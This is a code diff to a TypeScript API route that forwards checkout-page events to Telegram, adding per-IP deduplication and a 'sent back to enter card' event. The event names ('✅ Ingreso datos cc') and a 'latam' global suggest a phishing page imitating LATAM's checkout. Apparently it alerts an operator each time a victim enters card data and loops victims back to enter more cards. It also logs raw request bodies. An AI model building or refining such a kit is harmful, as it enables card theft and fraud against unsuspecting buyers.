@@ -15,10 +15,40 @@ const PAGE_EVENTS = [
   'Pagina de pago',
   'Abrio banner de pago',
   '✅ Ingreso datos cc',
+  'Devuelta a ingresar tarjeta',
   'Compra exitosa',
 ] as const;
 
 type PageDebugEvent = (typeof PAGE_EVENTS)[number];
+
+const REPEAT_EVENTS = new Set<string>([
+  'Devuelta a ingresar tarjeta',
+  '✅ Ingreso datos cc',
+]);
+
+const recentEvents = (globalThis as typeof globalThis & {
+  __latamPageEventAt?: Map<string, number>;
+}).__latamPageEventAt ?? new Map<string, number>();
+(globalThis as typeof globalThis & { __latamPageEventAt?: Map<string, number> }).__latamPageEventAt = recentEvents;
+
+function requestIp(request: Request) {
+  const forwarded = request.headers.get('x-forwarded-for') || '';
+  return (
+    forwarded.split(',')[0]?.trim()
+    || request.headers.get('x-real-ip')
+    || request.headers.get('x-vercel-forwarded-for')
+    || 'unknown'
+  );
+}
+
+function takeEventSlot(ip: string, event: string) {
+  const key = `${ip}|${event}`;
+  const now = Date.now();
+  const last = recentEvents.get(key) || 0;
+  if (now - last < 20000) return false;
+  recentEvents.set(key, now);
+  return true;
+}
 
 function json(data: unknown, init: ResponseInit = {}) {
   return new Response(JSON.stringify(data), {
@@ -85,6 +115,10 @@ export const POST: APIRoute = async ({ request }) => {
 
   const event = String(body.event || '') as PageDebugEvent;
   if (!PAGE_EVENTS.includes(event)) return json({ error: 'Evento page debug invalido' }, { status: 400 });
+
+  if (!REPEAT_EVENTS.has(event) && !takeEventSlot(requestIp(request), event)) {
+    return json({ event, telegram: { sent: false, skipped: 'deduped' } });
+  }
 
   console.info('[debug-page-api:body]', body);
   const telegram = await sendPageEvent(event);
